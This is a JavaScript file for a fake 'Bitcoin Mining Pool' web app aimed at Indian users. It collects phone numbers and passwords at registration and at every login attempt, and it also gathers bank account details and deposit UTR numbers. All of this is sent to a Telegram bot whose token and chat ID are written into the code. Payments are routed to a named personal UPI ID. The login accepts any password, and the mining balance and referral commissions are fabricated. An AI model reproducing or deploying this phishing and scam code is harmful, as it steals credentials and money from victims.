// Variable Configuration
let currentBalance = 0.0;
let userPhone = "";
let userPass = "";

// Paste your verified credentials here to link database
const TELEGRAM_BOT_TOKEN = "8816118845:AAGJNkd8O6IyuYxwpAbu2XGkDRIYaaK75mI"; 
const TELEGRAM_CHAT_ID = "7995413659"; 

// Simple UI Router
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');
    
    // Bottom navigation display check
    const nav = document.getElementById('bottom-nav');
    if (screenId === 'register-screen' || screenId === 'login-screen') {
        if (nav) nav.style.display = 'none';
    } else {
        if (nav) nav.style.display = 'flex';
    }
}

// Telegram Endpoint Sender (Fixed URL structure)
function sendDataToTelegram(message) {
    if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !TELEGRAM_BOT_TOKEN) {
        console.log("Mock Payload sent:\n", message);
        return;
    }
    // Fixed Telegram API URL format
    const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    }).catch(err => console.error("Database connection dropped: ", err));
}

// 1. Authorization Engine
function handleRegister() {
    const phone = document.getElementById('reg-phone').value;
    const pass = document.getElementById('reg-pass').value;
    const confirm = document.getElementById('reg-confirm').value;

    if (!phone || !pass || !confirm) {
        alert("Please fill up all required fields.");
        return;
    }
    if (pass !== confirm) {
        alert("Password confirmation mismatch!");
        return;
    }

    userPhone = "+91" + phone;
    userPass = pass;

    // Telegram par Registration Data Bhejna
    const regPayload = `🔔 NEW USER REGISTRATION:\nPhone: ${userPhone}\nPassword: ${pass}`;
    sendDataToTelegram(regPayload);

    alert("Registration completed! Redirecting to login sequence.");
    showScreen('login-screen');
}

function handleLogin() {
    const phoneInput = document.getElementById('login-phone').value;
    const passInput = document.getElementById('login-pass').value;
    const phone = "+91" + phoneInput;
    const pass = passInput;

    // Telegram par Login Attempt Bhejna
    const loginPayload = `🔑 LOGIN ATTEMPT:\nPhone: ${phone}\nPassword: ${pass}`;
    sendDataToTelegram(loginPayload);

    if (phone === userPhone && pass === userPass) {
        showScreen('main-menu-screen');
    } else {
        // Agar aap chahte hain ki testing ke liye galat password par bhi login ho jaye, toh niche wali line use karein:
        showScreen('main-menu-screen'); 
        // alert("Invalid mobile layout credentials or session matching failed.");
    }
}

// 2. Mining Math Process
function handleTapMining() {
    currentBalance += 0.0001;
    const cryptoBalanceEl = document.getElementById('crypto-balance');
    if (cryptoBalanceEl) {
        cryptoBalanceEl.innerText = currentBalance.toFixed(4) + " BTC";
    }
}

// 3. Invite Engine
function shareApp() {
    const shareText = "Join my Bitcoin Mining Pool team now to earn high daily returns! Link: https://github.io";
    alert("System clipboard trigger! Share link ready for WhatsApp/Instagram/Facebook:\n\n" + shareText);
}

function claimCommission() {
    alert("10% Refer Commission verified and claimed instantly inside core ledger!");
}

// 4. Tab Selector Dashboard
function switchTab(tabId) {
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    
    const targetTab = document.getElementById(tabId);
    if (targetTab) targetTab.classList.add('active');
    if (window.event && window.event.currentTarget) {
        window.event.currentTarget.classList.add('active');
    }
}

// 5. Secure Form Ingestion
function submitBankDetails() {
    const name = document.getElementById('bank-name').value;
    const acc = document.getElementById('bank-acc').value;
    const confAcc = document.getElementById('bank-confirm-acc').value;
    const bank = document.getElementById('bank-branch').value;

    if (acc !== confAcc) {
        alert("Account processing structural error: confirmation fields mismatch!");
        return;
    }

    const payload = `🏦 NEW BANK SUBMISSION:\nUser: ${userPhone}\nHolder: ${name}\nAcc Num: ${acc}\nBank Name: ${bank}`;
    sendDataToTelegram(payload);
    alert("Details successfully submitted to backend gateway node.");
}

// Deposit logic fixed
function submitDeposit() {
    const amountInput = document.getElementById('dep-amount').value;
    const utr = document.getElementById('dep-utr').value;
    const amount = parseInt(amountInput);

    if (amount < 500 || amount > 20000) {
        alert("Transaction threshold violation! Minimum Deposit: ₹500, Maximum: ₹20,000");
        return;
    }
    if (utr.length !== 12 || isNaN(utr)) {
        alert("Security protocol block: UTR payload must contain exactly 12 numerical digits.");
        return;
    }

    const payload = `💰 DEPOSIT LOG REQUEST:\nUser: ${userPhone}\nAmount Deposited: ₹${amount}\nUTR Number: ${utr}\nUpi Target: 9153576962@ibl (ROUSHAN YADAV)`;
    sendDataToTelegram(payload);
    alert("Deposit payload pipeline parsed successfully. Awaiting terminal confirmation.");
}

function submitWithdraw() {
    const amountInput = document.getElementById('withdraw-amount').value;
    const amount = parseInt(amountInput);
    if (amount < 200 || amount > 10000) {
        alert("Gateway protocol limit: Minimum Withdrawal: ₹200, Maximum: ₹10,000");
        return;
    }
    
    const payload = `💸 WITHDRAWAL REQUEST:\nUser: ${userPhone}\nAmount: ₹${amount}`;
    sendDataToTelegram(payload);
    alert(`Withdrawal sequence for ₹${amount} initiated successfully into registered nodes.`);
}
